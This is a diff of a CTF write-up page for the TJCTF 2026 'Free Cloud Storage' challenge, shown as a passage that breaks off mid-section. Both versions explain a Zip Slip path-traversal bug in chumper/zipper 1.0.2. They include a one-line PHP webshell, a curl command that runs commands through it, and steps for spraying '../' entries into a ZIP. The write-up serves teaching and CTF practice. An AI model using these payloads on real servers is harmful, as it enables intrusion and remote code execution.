@@ -1,401 +1,521 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="en" class="dark">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Yuri08 - TJCTF 2026: Free Cloud Storage</title>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" />
-  <style>
-    :root {
-      --main: #f97316; --main2: #10b981; --main-light: #fb923c;
-      --bg: #0f0f1a; --bg2: #181a2a; --glass: rgba(30, 25, 60, 0.9);
-      --text: #e0e7ef; --shadow: 0 8px 32px 0 #f9731633;
-      --glow: 0 0 20px 2px #f9731644; --highlight: #38bdf8;
-    }
-    html, body {
-      min-height: 100%; margin: 0; font-family: 'JetBrains Mono', monospace;
-      background: radial-gradient(circle at 50% 0%, #2a1f1a 0%, #0f0f1a 100%);
-      color: var(--text); overflow: hidden; perspective: 1000px;
-    }
-    #particles-js {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none;
-    }
-    .content-wrapper {
-      position: relative; z-index: 1; height: 100vh; display: flex; flex-direction: column;
-      padding: 20px; box-sizing: border-box; gap: 15px;
-    }
-    
-    .header {
-      display: flex; align-items: center; gap: 20px; padding: 15px;
-      background: var(--glass); border-radius: 1rem; border: 1px solid #f9731644;
-      box-shadow: var(--shadow); backdrop-filter: blur(10px); flex-shrink: 0;
-    }
-    .avatar {
-      width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--main);
-      object-fit: cover; box-shadow: 0 0 15px var(--main);
-    }
-    .header-info h1 {
-      font-size: 1.8rem; margin: 0; color: var(--main);
-      text-shadow: 0 0 10px #f9731688; animation: neonOrange 2s infinite alternate;
-    }
-    .header-info p { margin: 5px 0 0 0; color: var(--main-light); font-size: 0.9rem; }
-    @keyframes neonOrange { to { text-shadow: 0 0 15px var(--main), 0 0 30px var(--main); } }
-    
-    .lang-toggle {
-      margin-left: auto; background: var(--main); color: white; border: none;
-      padding: 8px 15px; border-radius: 0.5rem; cursor: pointer; font-family: inherit;
-      font-weight: bold; transition: 0.3s; box-shadow: 0 0 10px #f9731655;
-    }
-    .lang-toggle:hover { background: #ea580c; transform: scale(1.05); }
-
-    .terminal-pro {
-      background: linear-gradient(135deg, #1a1512 80%, #f9731611 100%);
-      border-radius: 1rem; border: 1px solid #3f2e2155; box-shadow: var(--shadow), var(--glow);
-      display: flex; flex-direction: column; flex-grow: 1; overflow: hidden; position: relative;
-    }
-    .terminal-pro::before {
-      content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-      background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15), rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px);
-      pointer-events: none; z-index: 2; opacity: 0.2;
-    }
-    .terminal-bar {
-      background: #1e1e2e; height: 2.5rem; display: flex; align-items: center;
-      padding: 0 1rem; border-bottom: 1px solid #312e8155; flex-shrink: 0; z-index: 3;
-    }
-    .dot { width: 12px; height: 12px; border-radius: 50%; margin-right: 6px; }
-    .red { background: #ef4444; } .yellow { background: #facc15; } .green { background: #22c55e; }
-    .terminal-title { color: var(--main-light); margin-left: 1rem; font-weight: bold; letter-spacing: 1px; }
-    
-    .terminal-body {
-      padding: 1.5rem; flex-grow: 1; overflow-y: auto; font-size: 0.95rem;
-      line-height: 1.6; position: relative; z-index: 1; scroll-behavior: smooth;
-    }
-    #terminal-output { white-space: pre-wrap; word-break: break-word; }
-    #terminal-input-line {
-      display: flex; align-items: center; gap: 0.5em; margin-top: 1em; z-index: 3;
-    }
-    #terminal-input {
-      background: transparent; border: none; color: #a7f3d0; outline: none;
-      font-family: inherit; font-size: 1em; width: 100%; caret-color: var(--main);
-    }
-    
-    .cmd { color: #7c3aed; } .arg { color: #a78bfa; } .info { color: #38bdf8; font-weight: bold; }
-    .error { color: #ef4444; } .success { color: #10b981; } .warning { color: #facc15; }
-    .code-block {
-      background: #0d0d1a; border-left: 3px solid var(--main); padding: 10px 15px;
-      margin: 10px 0; border-radius: 0 5px 5px 0; font-size: 0.9rem; color: #d1d5db;
-    }
-    
-    .terminal-body::-webkit-scrollbar { width: 8px; }
-    .terminal-body::-webkit-scrollbar-track { background: #0f0f1a; }
-    .terminal-body::-webkit-scrollbar-thumb { background: #f97316; border-radius: 4px; }
-
-    #welcome-screen {
-      position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-      background: #0f0f1a; z-index: 10000; display: flex; flex-direction: column;
-      justify-content: center; align-items: center; text-align: center; transition: opacity 0.8s;
-    }
-    #welcome-screen.hidden { opacity: 0; pointer-events: none; }
-    #start-button {
-      background: var(--main); color: white; border: none; border-radius: 0.7rem;
-      padding: 1rem 2rem; font-size: 1.2rem; font-weight: 700; cursor: pointer;
-      font-family: inherit; transition: all 0.3s; box-shadow: 0 0 20px #f9731688;
-    }
-    #start-button:hover { background: #ea580c; transform: translateY(-3px); }
-    
-    #mute-button {
-      position: fixed; top: 20px; right: 20px; z-index: 10001;
-      background: #1e1e2e; color: var(--main-light); border: 1px solid #f9731655;
-      border-radius: 50%; width: 40px; height: 40px; font-size: 1.2rem; cursor: pointer;
-      display: flex; justify-content: center; align-items: center; transition: all 0.3s;
-    }
-    #mute-button:hover { background: var(--main); color: white; }
-
-    @media (max-width: 768px) {
-      .header { flex-wrap: wrap; justify-content: center; text-align: center; }
-      .lang-toggle { margin-left: 0; margin-top: 10px; width: 100%; }
-      .avatar { width: 60px; height: 60px; }
-      .header-info h1 { font-size: 1.4rem; }
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TJCTF 2026: Free Cloud Storage — QA210</title>
+<meta name="description" content="TJCTF 2026 Free Cloud Storage — Web / Archive Path Traversal walkthrough by QA210">
+<meta name="author" content="QA210">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>☁️</text></svg>">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap');
+:root {
+  --bg-primary:#0a0e17;--bg-secondary:#111827;--bg-tertiary:#1a2236;
+  --bg-code:#0d1117;--border:#1e293b;--border-light:#1a2332;
+  --text-primary:#e2e8f0;--text-secondary:#94a3b8;--text-muted:#64748b;
+  --accent-green:#22d3ee;--accent-blue:#818cf8;--accent-red:#f87171;
+  --accent-yellow:#fbbf24;--accent-purple:#c084fc;--accent-orange:#fb923c;
+  --accent-cyan:#22d3ee;--accent-pink:#f472b6;
+  --link:#818cf8;--link-hover:#a5b4fc;
+  --scrollbar-thumb:#1e293b;--scrollbar-track:#0a0e17;
+  --toc-active:#818cf8;
+  --callout-info-bg:rgba(129,140,248,0.08);--callout-info-border:#818cf8;
+  --callout-warn-bg:rgba(251,191,36,0.08);--callout-warn-border:#fbbf24;
+  --callout-danger-bg:rgba(248,113,113,0.08);--callout-danger-border:#f87171;
+  --callout-success-bg:rgba(34,211,238,0.08);--callout-success-border:#22d3ee;
+  --callout-hint-bg:rgba(192,132,252,0.08);--callout-hint-border:#c084fc;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scrollbar-width:thin;scrollbar-color:var(--scrollbar-thumb) var(--scrollbar-track)}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg-primary);color:var(--text-primary);line-height:1.75;font-size:16px}
+::-webkit-scrollbar{width:8px;height:8px}
+::-webkit-scrollbar-track{background:var(--scrollbar-track)}
+::-webkit-scrollbar-thumb{background:var(--scrollbar-thumb);border-radius:4px}
+::-webkit-scrollbar-thumb:hover{background:#334155}
+a{color:var(--link);text-decoration:none;transition:color .2s}
+a:hover{color:var(--link-hover)}
+#three-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;opacity:0.35}
+.site-header{position:sticky;top:0;z-index:100;background:rgba(10,14,23,0.88);backdrop-filter:blur(16px);border-bottom:1px solid var(--border);padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+.site-header .logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:1.1rem;color:var(--accent-cyan);display:flex;align-items:center;gap:8px}
+.site-header .logo .dot{color:var(--accent-pink)}
+.site-header nav{display:flex;gap:1.5rem;align-items:center}
+.site-header nav a{color:var(--text-secondary);font-size:.85rem;font-weight:500}
+.site-header nav a:hover{color:var(--text-primary)}
+.hamburger{display:none;background:none;border:none;color:var(--text-primary);cursor:pointer;font-size:1.5rem}
+.page-layout{display:grid;grid-template-columns:260px 1fr;max-width:1400px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc-sidebar{position:sticky;top:56px;height:calc(100vh - 56px);overflow-y:auto;padding:1.5rem 1rem 1.5rem 1.5rem;border-right:1px solid var(--border);background:var(--bg-primary)}
+.toc-sidebar h3{font-size:.72rem;text-transform:uppercase;letter-spacing:.1em;color:var(--text-muted);margin-bottom:.75rem;font-weight:600}
+.toc-sidebar ul{list-style:none}
+.toc-sidebar li{margin-bottom:2px}
+.toc-sidebar a{display:block;padding:4px 8px;border-radius:4px;font-size:.78rem;color:var(--text-secondary);transition:all .15s;line-height:1.4}
+.toc-sidebar a:hover{color:var(--text-primary);background:var(--bg-secondary)}
+.toc-sidebar a.active{color:var(--toc-active);background:rgba(129,140,248,0.1);font-weight:600}
+.toc-sidebar .toc-h3{padding-left:18px;font-size:.72rem}
+.main-content{padding:2.5rem 3rem 4rem;max-width:860px;width:100%}
+.page-hero{margin-bottom:2.5rem;padding-bottom:2rem;border-bottom:1px solid var(--border)}
+.page-hero .box-badge{display:inline-block;background:linear-gradient(135deg,var(--accent-orange),var(--accent-pink));color:#fff;font-size:.68rem;font-weight:700;padding:2px 12px;border-radius:12px;text-transform:uppercase;letter-spacing:.06em;margin-bottom:.75rem}
+.page-hero h1{font-size:2.25rem;font-weight:800;margin-bottom:.5rem;letter-spacing:-.02em}
+.page-hero .meta{color:var(--text-secondary);font-size:.85rem;display:flex;flex-wrap:wrap;gap:.75rem;align-items:center}
+.page-hero .meta .sep{color:var(--text-muted)}
+.box-info-card{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin-bottom:2rem;display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:1rem}
+.box-info-card .info-item .label{font-size:.68rem;text-transform:uppercase;letter-spacing:.07em;color:var(--text-muted);margin-bottom:2px;font-weight:600}
+.box-info-card .info-item .value{font-size:.92rem;font-weight:600;color:var(--text-primary)}
+.attack-path{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin:1.5rem 0;font-family:'JetBrains Mono',monospace;font-size:.75rem;line-height:1.7;overflow-x:auto}
+.attack-path .step{display:flex;align-items:baseline;gap:.5rem;margin-bottom:.2rem}
+.attack-path .arrow{color:var(--accent-cyan)}
+.attack-path .host{color:var(--accent-cyan);font-weight:700}
+.attack-path .technique{color:var(--accent-orange)}
+.attack-path .cred{color:var(--accent-purple)}
+.main-content h2{font-size:1.55rem;font-weight:800;margin:2.5rem 0 1rem;padding-bottom:.4rem;border-bottom:2px solid var(--border);letter-spacing:-.01em;scroll-margin-top:70px}
+.main-content h3{font-size:1.1rem;font-weight:700;margin:1.75rem 0 .75rem;color:var(--text-primary);scroll-margin-top:70px}
+.main-content h4{font-size:.95rem;font-weight:600;margin:1.25rem 0 .5rem;color:var(--text-secondary)}
+.main-content p{margin-bottom:1rem;color:var(--text-secondary);line-height:1.8}
+.code-block-wrapper{position:relative;margin:1rem 0 1.25rem;border-radius:8px;overflow:hidden;border:1px solid var(--border)}
+.code-block-header{display:flex;justify-content:space-between;align-items:center;padding:6px 14px;background:var(--bg-tertiary);border-bottom:1px solid var(--border);font-size:.7rem;color:var(--text-muted);font-family:'JetBrains Mono',monospace}
+.code-block-header .lang-label{text-transform:uppercase;font-weight:600;letter-spacing:.04em}
+.copy-btn{background:none;border:1px solid var(--border);color:var(--text-muted);font-size:.68rem;padding:2px 10px;border-radius:4px;cursor:pointer;font-family:'JetBrains Mono',monospace;transition:all .2s}
+.copy-btn:hover{color:var(--text-primary);border-color:var(--text-muted)}
+.copy-btn.copied{color:var(--accent-green);border-color:var(--accent-green)}
+.code-block-wrapper pre{margin:0!important;padding:1rem!important;background:var(--bg-code)!important;font-family:'JetBrains Mono',monospace!important;font-size:.8rem!important;line-height:1.6!important;overflow-x:auto}
+.code-block-wrapper code{font-family:'JetBrains Mono',monospace!important;font-size:.8rem!important}
+p code,li code{background:var(--bg-tertiary);border:1px solid var(--border);padding:1px 6px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:.82em;color:var(--accent-orange)}
+.callout{padding:.85rem 1rem;border-radius:6px;border-left:3px solid;margin:1rem 0 1.25rem;font-size:.88rem}
+.callout p{margin:0;color:var(--text-secondary)}
+.callout-title{font-weight:700;font-size:.78rem;text-transform:uppercase;letter-spacing:.04em;margin-bottom:4px}
+.callout-info{background:var(--callout-info-bg);border-color:var(--callout-info-border)}
+.callout-info .callout-title{color:var(--callout-info-border)}
+.callout-warn{background:var(--callout-warn-bg);border-color:var(--callout-warn-border)}
+.callout-warn .callout-title{color:var(--callout-warn-border)}
+.callout-danger{background:var(--callout-danger-bg);border-color:var(--callout-danger-border)}
+.callout-danger .callout-title{color:var(--callout-danger-border)}
+.callout-success{background:var(--callout-success-bg);border-color:var(--callout-success-border)}
+.callout-success .callout-title{color:var(--callout-success-border)}
+.callout-hint{background:var(--callout-hint-bg);border-color:var(--callout-hint-border)}
+.callout-hint .callout-title{color:var(--callout-hint-border)}
+.main-content ul,.main-content ol{margin:.5rem 0 1rem 1.5rem;color:var(--text-secondary)}
+.main-content li{margin-bottom:.35rem;line-height:1.7}
+.main-content table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.85rem}
+.main-content th,.main-content td{padding:8px 12px;border:1px solid var(--border);text-align:left}
+.main-content th{background:var(--bg-secondary);font-weight:600;color:var(--text-primary);font-size:.73rem;text-transform:uppercase;letter-spacing:.04em}
+.main-content td{color:var(--text-secondary)}
+.site-footer{border-top:1px solid var(--border);padding:1.5rem 2rem;text-align:center;color:var(--text-muted);font-size:.8rem}
+.toc-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:200}
+.toc-overlay.show{display:block}
+.toc-mobile-panel{display:none;position:fixed;left:0;top:0;bottom:0;width:280px;background:var(--bg-primary);border-right:1px solid var(--border);z-index:201;overflow-y:auto;padding:1.5rem}
+.toc-mobile-panel.show{display:block}
+.toc-mobile-panel .close-btn{background:none;border:none;color:var(--text-secondary);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:1024px){.page-layout{grid-template-columns:1fr}.toc-sidebar{display:none}.hamburger{display:block}.main-content{padding:1.5rem 1.25rem 3rem}.page-hero h1{font-size:1.75rem}}
+@media(max-width:640px){.site-header{padding:0 1rem}.main-content{padding:1rem .75rem 2rem}.page-hero h1{font-size:1.4rem}.box-info-card{grid-template-columns:1fr 1fr}}
+</style>
 </head>
 <body>
 
-  <div id="welcome-screen">
-    <h1 style="color: var(--main); text-shadow: 0 0 20px var(--main); margin-bottom: 20px;">Yuri08 CTF Terminal</h1>
-    <p style="color: #fdba74; margin-bottom: 30px;">TJCTF 2026 - Web / Free Cloud Storage</p>
-    <button id="start-button">Khởi tạo Terminal</button>
-  </div>
+<canvas id="three-bg"></canvas>
 
-  <button id="mute-button" aria-label="Toggle Sound"><i class="bi bi-volume-up-fill"></i></button>
-  <div id="particles-js"></div>
+<header class="site-header">
+  <div class="logo"><span>QA210</span><span class="dot">:</span><span>~$</span></div>
+  <nav><a href="/">Home</a><a href="/tjctf-2026/">TJCTF</a><a href="#">Tools</a><a href="#">About</a></nav>
+  <button class="hamburger" onclick="toggleMobileToc()" aria-label="Menu">☰</button>
+</header>
 
-  <div class="content-wrapper">
-    <header class="header">
-      <img src="https://files.catbox.moe/755fgv.png" alt="Avatar" class="avatar" />
-      <div class="header-info">
-        <h1>Yuri08</h1>
-        <p>Web Exploiter | Archive Path Traversal Specialist</p>
-      </div>
-      <button class="lang-toggle" id="lang-btn" onclick="toggleLang()">Switch to English</button>
-    </header>
+<div class="toc-overlay" id="tocOverlay" onclick="toggleMobileToc()"></div>
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <button class="close-btn" onclick="toggleMobileToc()">✕</button>
+  <h3 style="margin-top:1rem">Contents</h3>
+  <ul id="tocMobile"></ul>
+</div>
 
-    <section class="terminal-pro">
-      <div class="terminal-bar">
-        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
-        <span class="terminal-title">root@tjctf:~/free-cloud-storage#</span>
-      </div>
-      <div class="terminal-body" id="terminal-body">
-        <pre id="terminal-output"></pre>
-        <div id="terminal-input-line">
-          <span class="cmd">root@tjctf</span>:<span class="arg">~/web</span>$           <input type="text" id="terminal-input" autocomplete="off" spellcheck="false" />
-        </div>
-      </div>
-    </section>
-  </div>
+<div class="page-layout">
+<aside class="toc-sidebar"><h3>Contents</h3><ul id="tocDesktop"></ul></aside>
 
-  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
-  <script>
-    let isMuted = false;
-    let currentLang = 'vi';
-    let userInteracted = false;
-    const output = document.getElementById('terminal-output');
-    const input = document.getElementById('terminal-input');
-    const tBody = document.getElementById('terminal-body');
+<main class="main-content">
 
-    particlesJS.load('particles-js', 'https://cdn.jsdelivr.net/gh/VincentGarreau/particles.js/particles.json');
+<div class="page-hero">
+  <span class="box-badge">Web</span>
+  <h1>TJCTF 2026: Free Cloud Storage</h1>
+  <div class="meta"><span>QA210</span><span class="sep">·</span><span>May 2026</span><span class="sep">·</span><span>ZIP · Path Traversal · Zip Slip</span></div>
+</div>
 
-    function playAudio(src, vol=0.2) {
-      if (!userInteracted || isMuted || !src) return;
-      try { const a = new Audio(src); a.volume = vol; a.play(); } catch(e) {}
-    }
+<div class="box-info-card">
+  <div class="info-item"><div class="label">Challenge</div><div class="value">Free Cloud Storage</div></div>
+  <div class="info-item"><div class="label">Category</div><div class="value" style="color:var(--accent-orange)">Web</div></div>
+  <div class="info-item"><div class="label">CTF</div><div class="value">TJCTF 2026</div></div>
+  <div class="info-item"><div class="label">Technique</div><div class="value">Zip Slip (Archive Path Traversal)</div></div>
+  <div class="info-item"><div class="label">Flag</div><div class="value" style="color:var(--accent-cyan)">tjctf{i_l0v3_fr33_st0r4g3}</div></div>
+</div>
 
-    document.getElementById('mute-button').addEventListener('click', function() {
-      isMuted = !isMuted;
-      this.querySelector('i').className = isMuted ? 'bi bi-volume-mute-fill' : 'bi bi-volume-up-fill';
-    });
+<div class="attack-path">
+  <div class="step"><span class="host">UPLOAD</span> <span class="arrow">→</span> Craft malicious ZIP with <span class="technique">../</span> filenames <span class="arrow">→</span> <span class="technique">chumper/zipper 1.0.2</span></div>
+  <div class="step"><span class="host">EXTRACT</span> <span class="arrow">→</span> extractTo() concatenates paths blindly <span class="arrow">→</span> <span class="technique">No realpath() check</span></div>
+  <div class="step"><span class="host">WRITE</span> <span class="arrow">→</span> PHP webshell written to <span class="cred">/var/www/html/</span> <span class="arrow">→</span> <span class="technique">Webroot traversal</span></div>
+  <div class="step"><span class="host">RCE</span> <span class="arrow">→</span> HTTP GET with <span class="technique">?c=cat /flag</span> <span class="arrow">→</span> <span class="cred">Flag obtained</span></div>
+</div>
 
-    function print(html) {
-      const div = document.createElement('div');
-      div.innerHTML = html;
-      output.appendChild(div);
-      tBody.scrollTop = tBody.scrollHeight;
-    }
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="overview">Challenge Overview</h2>
 
-    // --- TRANSLATIONS & DETAILED WRITEUP DATA ---
-    const L = {
-      vi: {
-        help: `<span class="info">[ Hướng Dẫn Đọc Writeup ]</span>
-<span class="cmd">intro</span>       : Tổng quan & Lỗ hổng Zip Slip
-<span class="cmd">rootcause</span>   : Nguyên nhân gốc rễ trong chumper/zipper 1.0.2
-<span class="cmd">pathlogic</span>   : Logic Path Traversal & Đường dẫn Đích
-<span class="cmd">strategy</span>    : Chiến thuật Khai thác (Webshell Injection)
-<span class="cmd">code</span>        : Source Code Khai thác (Python)
-<span class="cmd">clear</span>       : Xóa màn hình Terminal`,
-        intro: `<span class="info">[ TỔNG QUAN: FREE CLOUD STORAGE ]</span>
-<span class="cmd">Category:</span> Web / Archive Path Traversal
-<span class="cmd">Flag:</span> <span class="success">tjctf{i_l0v3_fr33_st0r4g3}</span>
+<p>The challenge deploys a free cloud storage service built on PHP with Laravel. Users can upload ZIP archives through a web form, and the server automatically extracts them into a designated uploads directory. The upload page advertises the service as a convenient way to share files — upload a ZIP, and it gets unpacked for anyone to browse. The twist is that the extraction library used by the backend is vulnerable to a classic archive path traversal bug known as <strong>Zip Slip</strong>.</p>
 
-<span class="warning">Mô tả:</span> Dịch vụ lưu trữ đám mây miễn phí cho phép người dùng upload file ZIP và tự động giải nén. Server sử dụng thư viện <span class="arg">chumper/zipper</span> phiên bản 1.0.2.
+<p>The application uses the <code>chumper/zipper</code> Composer package at version 1.0.2 — a version that predates the security patch that added path validation. This specific version blindly concatenates the filename stored inside the ZIP archive with the destination directory, allowing an attacker to escape the intended extraction folder by using relative path components like <code>../</code> in the entry names. The result is arbitrary file write on the server filesystem, which we leverage to plant a PHP webshell directly into the webroot.</p>
 
-<span class="cmd">Objective:</span> Khai thác lỗ hổng Zip Slip kinh điển để ghi đè một file PHP webshell lên thư mục webroot (docroot) của server, vượt qua giới hạn thư mục giải nén, từ đó thực thi lệnh và đọc flag.`,
-        rootcause: `<span class="info">[ NGUYÊN NHÂN GỐC RỄ: CHUMPER/ZIPPER 1.0.2 ]</span>
-Hàm <span class="cmd">extractTo()</span> của thư viện zipper 1.0.2 có một lỗi chí mạng: Nó giải nén các file dựa trên tên file được lưu trữ bên trong ZIP mà <span class="error">KHÔNG HÀM GIẢI PHÁP PATH (realpath validation)</span> đối chiếu với thư mục gốc đích.
+<div class="callout callout-info">
+  <div class="callout-title">Info — Zip Slip</div>
+  <p>Zip Slip is a widespread vulnerability affecting archive extraction libraries across many languages. The core issue is that the extraction routine does not validate that the resolved output path stays within the intended destination directory. By including path traversal sequences (<code>../</code>) in the filenames of entries inside the archive, an attacker can write files to arbitrary locations on the filesystem. This can lead to remote code execution when the written file lands in a directory served by the web server.</p>
+</div>
 
-<div class="code-block">// Lỗi logic mù lòa đường dẫn:
- $destination = '/var/www/html/uploads/' . $filename_from_zip;
-// Nếu $filename_from_zip = "../pwn.php"
-// $destination = '/var/www/html/uploads/../pwn.php' 
-// -> Thư mục lùi 1 cấp!</div>
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="root-cause">Root Cause: chumper/zipper 1.0.2</h2>
 
-Lỗi này đã được vá ở phiên bản 1.0.3 bằng cách kiểm tra realpath() để đảm bảo file giải nén không thoát khỏi thư mục uploads. Nhưng ở 1.0.2, cánh cửa hoàn toàn mở!`,
-        pathlogic: `<span class="info">[ LOGIC PATH TRAVERSAL & ĐƯỜNG DẪN ĐÍCH ]</span>
-Giả sử cấu hình thư mục web của nạn nhân:
-<span class="cmd">Webroot:</span>  /var/www/html/
-<span class="cmd">Upload:</span>   /var/www/html/uploads/
+<h3 id="vulnerable-code">The Vulnerable extractTo() Method</h3>
 
-Khi bạn upload file ZIP bình thường, file sẽ nằm trong /var/www/html/uploads/ và có thể truy cập qua URL <span class="arg">https://target/uploads/file.txt</span>.
+<p>The <code>chumper/zipper</code> library provides a convenient wrapper around PHP's <code>ZipArchive</code> class. Version 1.0.2 exposes an <code>extractTo()</code> method that iterates over every entry in the ZIP file and writes it to the destination path. The critical flaw is in how it constructs the output filename — it simply concatenates the destination directory with the entry name from the archive, without ever checking whether the resolved path escapes the target directory:</p>
 
-<span class="warning">Vượt giới hạn bằng ../:</span>
-Nếu ta nhét một file có tên <span class="cmd">../pwn1.php</span> vào ZIP. Hàm extractTo() sẽ nối chuỗi:
-/var/www/html/uploads/ + ../pwn1.php
-= <span class="success">/var/www/html/pwn1.php</span>
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-php">// Simplified vulnerable logic in chumper/zipper 1.0.2
+foreach ($zip as $entry) {
+    $destination = $extractDir . '/' . $entry->getName();
+    // No realpath() validation!
+    // If $entry->getName() = "../../pwn.php"
+    // $destination = '/var/www/html/uploads/../../pwn.php'
+    // Which resolves to: /var/www/html/pwn.php
+    $entry->extractTo($destination);
+}</code></pre>
+</div>
 
-File PHP lúc này nằm ngay tại Webroot! Truy cập qua URL: <span class="arg">https://target/pwn1.php</span>.`,
-        strategy: `<span class="info">[ CHIẾN THUẬT KHAI THÁC ]</span>
-1. <span class="cmd">Chuẩn bị Webshell:</span> Tạo payload PHP ngắn gọn để thực thi lệnh hệ điều hành:
-   <span class="success"><?php system($_GET['c']); ?></span>
+<p>The fix in version 1.0.3 added a <code>realpath()</code> check after constructing the destination path. It verifies that the resolved path still starts with the extraction directory, rejecting any entry whose final location would fall outside the intended sandbox. Without this safeguard, the door is wide open for path traversal — any relative path component in the archive entry name is faithfully preserved through to the filesystem operation.</p>
 
-2. <span class="cmd">Đóng gói ZIP độc hại:</span> Sử dụng Python zipfile, tạo một file ZIP chứa các entry với tên file bắt đầu bằng chuỗi thoát thư mục <span class="arg">../</span>. Để đảm bảo trúng đích dù cấu hình sâu khác nhau, ta tạo nhiều depth (1, 2, 3, 4).
-   - <span class="cmd">../pwn1.php</span> (lùi 1 cấp)
-   - <span class="cmd">../../pwn2.php</span> (lùi 2 cấp)
+<div class="callout callout-warn">
+  <div class="callout-title">Warning</div>
+  <p>This class of vulnerability is not unique to <code>chumper/zipper</code>. The Zip Slip paper (Snyk, 2018) documented over 40 vulnerable libraries across Java, .NET, Go, Rust, Python, Ruby, and PHP. Any archive extraction code that does not validate the resolved output path against a base directory is susceptible.</p>
+</div>
 
-3. <span class="cmd">Kích hoạt:</span> Upload evil.zip lên dịch vụ. Server giải nén và ghi pwn1.php lên webroot.
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="path-logic">Path Traversal Logic</h2>
 
-4. <span class="cmd">RCE:</span> Gửi HTTP request để đọc flag:
-   <span class="arg">curl https://target/pwn1.php?c=cat%20/var/www/html/flag.txt</span>`,
-        code: `<span class="info">[ EXPLOIT SOURCE CODE ]</span>
-<div class="code-block">#!/usr/bin/env python3
+<h3 id="directory-layout">Server Directory Layout</h3>
+
+<p>To understand the exploit, consider the typical directory structure of the target application. The webroot is at <code>/var/www/html/</code>, and uploaded files are extracted into a subdirectory <code>/var/www/html/uploads/</code>. When a user uploads a legitimate ZIP archive, all extracted files land within the uploads folder and are accessible via URLs like <code>https://target/uploads/image.png</code>.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">text</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code>Webroot:  /var/www/html/
+Uploads:  /var/www/html/uploads/
+Flag:     /var/www/html/flag.txt</code></pre>
+</div>
+
+<h3 id="traversal-mechanism">Escaping the Uploads Directory</h3>
+
+<p>The attack is deceptively simple. If we create a ZIP archive containing an entry named <code>../shell.php</code>, the extraction routine will construct the following destination path:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">text</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code>Destination = /var/www/html/uploads/ + ../shell.php
+Resolved    = /var/www/html/shell.php</code></pre>
+</div>
+
+<p>The <code>../</code> component causes the path to ascend one directory level, effectively placing <code>shell.php</code> directly in the webroot. The file is now accessible at <code>https://target/shell.php</code> — completely bypassing the intended sandbox. For deeper directory structures, multiple <code>../</code> sequences can be chained: <code>../../shell.php</code> would ascend two levels, and so on. Since the exact depth of the uploads directory relative to the webroot may vary between deployments, we hedge our bets by generating entries at multiple traversal depths simultaneously.</p>
+
+<div class="callout callout-hint">
+  <div class="callout-title">Hint — Depth Spraying</div>
+  <p>When the exact directory depth is unknown, include entries at depths 1 through 4 in the same ZIP file. Only one needs to land in the webroot — the rest either fail silently or write to non-existent paths that cause no harm. This "spray and pray" approach is a standard technique in Zip Slip exploitation.</p>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="exploit-strategy">Exploit Strategy</h2>
+
+<h3 id="webshell-design">Webshell Payload</h3>
+
+<p>The first step is crafting a minimal PHP webshell that accepts a command via a GET parameter and executes it on the server. The payload is intentionally tiny to avoid any size restrictions or content filtering that might be in place:</p>
+
+<div class="code-block-wrapper">
